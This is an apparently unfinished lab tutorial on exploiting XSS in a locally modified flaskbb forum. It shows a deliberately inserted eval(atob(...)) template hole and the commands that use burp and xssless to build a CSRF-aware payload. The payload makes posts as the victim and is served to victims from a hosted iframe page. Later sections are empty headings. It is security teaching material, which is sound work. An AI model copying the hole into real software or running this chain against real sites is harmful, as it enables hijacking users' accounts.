Attacks
=======
Given a vulnerable application, we will try to devellop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
First we will setup a vulnerable application, then propose 3 different attacks :

    - execute actions on behalf of user
    - steal private information
    - Man In the Browser attack : interactive session hijacking, keylogger, browser exploits...
        
I. Setup the vulnerable application : a forum.
----------------------------------------------
In an attempt to be as realistic as possible, we decided to start with a real full-fledged application. We choose flaskbb[0], a forum developped in python using flask.

First step is to add our extra XSS "feature". We kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :

    localhost:8080/xss/YWxlcnQoMSkK

The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules, and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]

Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts.

II. Post a message on behalf of a user.
---------------------------------------
First, let's introduce two tools that we will use : 

    burp[2] : an http proxy, often used in web penetration tests because it is awesome. We will just scratch the surface here, using it to log our http traffic.
    xssless[3] : a python script to generate XSS payloads from burp's logs. Best part is that it takes care of crsf tokens (nonces) !

The procedure is as follow : 

    1) log in with a user we control.
    2) start burp's interception
    3) post a new message.
    4) export burp's logs
    5) list the csrf tokens
    6) run xssless
    7) modify the payload with our malicious message
    8) craft our exploit
    9) expose targeted users to our exploit

Steps 1-4 I won't describe.

Step 5 : In the requests that burp intercepted, we look for any parameter that might be a csrf token. It's usually obvious, and it certainly is here.

    echo 'csrf_token' > params

Step 6 : Xssless is nice because we don't even have to have a deep look into what's going on. We could probably skip some requests, but we know that repoducing step by step what we recorded will work. We just need to tell it which parameters to adapt dynamically.

    python2 ~/secu/xssless/xssless.py -s -p params ../burp-logs/post-topic.burp > post-topic.js

Step 7 : Now you can edit the payload to replace the title or content of the post you want. 

    grep content post-topic.js
        [...] &title=I+think&content=I%27ve+been+hacked+%3A%28 [...]

Just don't forget to url-encode your texts.

Step 8 : At this point we should run our payload through a js minifyer. Here we won't, for the sake of simplicity. To have a working exploit we need however the base64 of our payload, and to remove the script tag :
    
    grep -v script post-topic.js | base64 -w0 > post-topic.b64

Step 9 : Now, all we have to do is put it somewhere on internet and bring authenticated users of our forum to visit it.

    echo "<iframe src='localhost:8080/xss/$(cat xssless-payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html
    cd malicious-website && python3 -m http.server 1337

Step 10 : profit !  [[Images ?]]

III. Read a user's private conversations.
-----------------------------------------

IV. Steal a user's password, and beyond ! Man In the Browser.
-------------------------------------------------------------

V. Going further.
-----------------
    xssless : worms !

Refs
----
    [0] https://github.com/sh4nks/flaskbb
    [1] The following modifications have been made to flaskbb[0] :
            forum/views.py (l35-66)
                @forum.route("/xss/<payload>")
                [...]
                return( [...],
                    payload=payload)

            templates/forum/index.html (l4)
                <script>eval(atob("{{ payload }}"))</script>
    [2] http://portswigger.net/burp/
    [3] https://github.com/mandatoryprogrammer/xssless
